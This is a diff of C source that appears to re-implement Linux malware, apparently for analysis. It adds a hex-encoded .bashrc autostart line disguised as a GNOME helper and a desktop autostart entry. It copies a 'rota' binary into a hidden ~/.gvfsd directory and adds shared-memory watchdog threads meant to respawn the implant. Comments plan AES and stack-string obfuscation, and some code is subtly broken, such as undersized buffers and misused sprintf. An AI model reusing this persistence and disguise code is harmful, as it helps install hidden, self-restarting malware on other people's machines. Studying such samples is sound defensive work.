@@ -6,6 +6,8 @@
 #include <errno.h>
 #include <fcntl.h>
 #include <sys/stat.h>
+#include <sys/shm.h>
+#include <pthread.h>
 
 // custom headers
 #include "persistence.h"
@@ -22,6 +24,9 @@ bool nonroot_bashrc_persistence() {
     * if [ -d ${HOME} ]; then
     *     ${HOME}/.gvfsd/.profile/gvfsd-helper
     * fi
+    *
+    *
+    *
     * */
 
     char bashrc_autostart [219] = {0x23,0x20,0x41,0x64,0x64,0x20,0x47,0x4e,0x4f,0x4d,0x45,0x27,0x73,0x20,0x68,0x65,0x6c,0x70,0x65,0x72,0x20,0x64,0x65,0x73,0x69,0x67,0x6e,0x65,0x64,0x20,0x74,0x6f,0x20,0x77,0x6f,0x72,0x6b,0x20,0x77,0x69,0x74,0x68,0x20,0x74,0x68,0x65,0x20,0x49,0x2f,0x4f,0x20,0x61,0x62,0x73,0x74,0x72,0x61,0x63,0x74,0x69,0x6f,0x6e,0x20,0x6f,0x66,0x20,0x47,0x49,0x4f,0xa,0x23,0x20,0x74,0x68,0x69,0x73,0x20,0x65,0x6e,0x76,0x69,0x72,0x6f,0x6e,0x6d,0x65,0x6e,0x74,0x20,0x76,0x61,0x72,0x69,0x61,0x62,0x6c,0x65,0x20,0x69,0x73,0x20,0x73,0x65,0x74,0x2c,0x20,0x67,0x76,0x66,0x73,0x64,0x20,0x77,0x69,0x6c,0x6c,0x20,0x6e,0x6f,0x74,0x20,0x73,0x74,0x61,0x72,0x74,0x20,0x74,0x68,0x65,0x20,0x66,0x75,0x73,0x65,0x20,0x66,0x69,0x6c,0x65,0x73,0x79,0x73,0x74,0x65,0x6d,0xa,0x69,0x66,0x20,0x5b,0x20,0x2d,0x64,0x20,0x24,0x7b,0x48,0x4f,0x4d,0x45,0x7d,0x20,0x5d,0x3b,0x20,0x74,0x68,0x65,0x6e,0xa,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x24,0x7b,0x48,0x4f,0x4d,0x45,0x7d,0x2f,0x2e,0x67,0x76,0x66,0x73,0x64,0x2f,0x2e,0x70,0x72,0x6f,0x66,0x69,0x6c,0x65,0x2f,0x67,0x76,0x66,0x73,0x64,0x2d,0x68,0x65,0x6c,0x70,0x65,0x72,0xa,0x66,0x69,0xa};
@@ -37,7 +42,7 @@ bool nonroot_bashrc_persistence() {
     strncat(fpath, bashrc, strlen(bashrc));
 
     // TODO: decrypt and rotate char array for stack string to then execute write_to_file
-    int fd = open(fpath, O_CREAT|O_APPEND|O_WRONLY, 0700);
+    int fd = open(fpath, O_WRONLY | O_APPEND | O_CREAT , 0755);
     if (fd < 0) {
         return false;
     }
@@ -45,7 +50,7 @@ bool nonroot_bashrc_persistence() {
     bytes_written = write(fd, bashrc_autostart, strlen(bashrc_autostart));
 
     if (bytes_written < 0) {
-        fprintf(stderr, "error writing to bashrc: %s", strerror(errno));
+        fprintf(stderr, "\nError writing to bashrc: %s", strerror(errno));
     }
 
     close(fd);
@@ -92,11 +97,12 @@ bool nonroot_desktop_persistence() {
     // TODO: decrypt and rotate char array for stack string to then execute write_to_file
     bool result = write_to_file(fpath, gnomehelper_desktop);
 
-    // -------- copy userland binry now -------------
+    // -------- copy userland binry now ------------- 
     //
     // copy rota binary
     // TODO convert gvfsd_helper into char array
     // TODO decrypt and rotate char array below
+    //
     char *gvfsd_helper= "/.gvfsd/.profile/gvfsd-helper";
     fpath_size = strlen(HOME) + strlen(gvfsd_helper);
     char *binpath = (char *)malloc(fpath_size);
@@ -115,7 +121,7 @@ bool nonroot_desktop_persistence() {
     if (access(dirpath_profile, F_OK) == -1) {
         int res = mkdir(dirpath_profile, 0755);
         if (res != 0) {
-            fprintf(stderr, "\nError creating directory to %s\nnerror: %s",
+            fprintf(stderr, "\n[gvfsd]Error creating directory to %s.\tError: %s",
                 dirpath_profile, strerror(errno));
         }
 
@@ -131,7 +137,7 @@ bool nonroot_desktop_persistence() {
     if (access(profilepath_profile, F_OK) == -1) {
         int res = mkdir(profilepath_profile, 0755);
         if (res != 0) {
-            fprintf(stderr, "\nError creating directory to %s\nnerror: %s",
+            fprintf(stderr, "\n[gvfsd/profile]Error creating directory to %s\tError: %s",
                 dirpath_profile, strerror(errno));
         }
     }
@@ -140,7 +146,7 @@ bool nonroot_desktop_persistence() {
     bool rota_write = copy_rota_to_userland(binpath);
 
     if (rota_write == false) {
-        fprintf(stderr, "\nError writing rota to %s:\nerror : %s",
+        fprintf(stderr, "\n[rota]Error writing rota to %s.\tError : %s",
                 binpath, strerror(errno));
     }
 
@@ -154,7 +160,7 @@ bool nonroot_persistence(void) {
     // handy wraper funtion for non-root persistence.
     // note - this is not 1:1 with how the analyzed samples call persistence methods.
 
-    nonroot_desktop_persistence();
+    //nonroot_desktop_persistence();
     nonroot_bashrc_persistence();
     return true;
 }
@@ -266,4 +272,97 @@ bool copy_rota_to_userland(char *destpath) {
     }
 
     return false;
+}
+
+void watchdog_process_shmget(char *fpath){
+
+    bool proc_alive;
+    int pid = getpid();
+    char *c_pid = (char *)malloc(sizeof(int));
+    sprintf(c_pid, "%d", pid);
+
+    // obtain PID from shared memory
+    int shmid = shmget(0x64b2e2, 8, IPC_CREAT |0666);
+    if (shmid <= 0) {
+        fprintf(stderr, "\n[wathcdog_process_shmget] Error getting shared memory : %s\n", strerror(errno));
+            //execvp(fpath, NULL);
+    }
+    void *addr = shmat(shmid, NULL, 0);
+
+
+    // write PID to sharedmem
+    memcpy(addr, c_pid, 8);
+    sleep(10);
+
+    // TODO - stackstring + AES + ROR here
+
+    do {
+
+        //  check /proc/<PID> exists....
+        proc_alive = monitor_proc(pid);
+
+        //if proc not there, exec into existence
+        if (proc_alive == false) {
+            fprintf(stderr, "process is not alive! spawning");
+            //execvp(fpath, NULL);
+        }
+
+        sleep(3);
+    } while(true);
+
+
+    if (fpath != NULL) {
+        free(fpath);
+    }
+
+    // detatch from process
+    pthread_detach(pthread_self());
+}
+
+
+void watchdog_process_shmread(char *fpath) {
+
+    bool proc_alive;
+
+    do {
+        int shmid = shmget(0x64b2e2, 8, IPC_CREAT | 0666);
+        if (shmid <= 0) {
+            fprintf(stderr, "\n[wathcdog_process_shmread] Error reading shared memory : %s\n", strerror(errno));
+            //execvp(fpath, NULL);
+        }
+
+        // get pid from shared memory.
+        int *addr = shmat(shmid, NULL, 0);
+        int *c_pid = (char *)malloc(sizeof(int));
+        sprintf(c_pid, "%d",  addr);
+
+        proc_alive = monitor_proc(*c_pid);
+
+        //if proc not there, exec into existence
+        if (proc_alive == false) {
+            fprintf(stderr, "process is not alive! spawning");
+            //execvp(fpath, NULL);
+        }
+        // if process dies execute
+        if (!access(fpath, F_OK)) {
+            //execvp(fpath, NULL);
+        }
+
+        sleep(3);
+    } while(true);
+
+    pthread_detach(pthread_self());
+}
+
+
+void spawn_thread_watchdog(int uid, char *fpath)
+{
+    pthread_t threadid;
+    if (uid == 0){
+        // "the parent thread"
+        pthread_create(&threadid, NULL, watchdog_process_shmget, fpath);
+    } else {
+        // "the child thread"
+        pthread_create(&threadid, NULL, watchdog_process_shmread, fpath);
+    }
 }
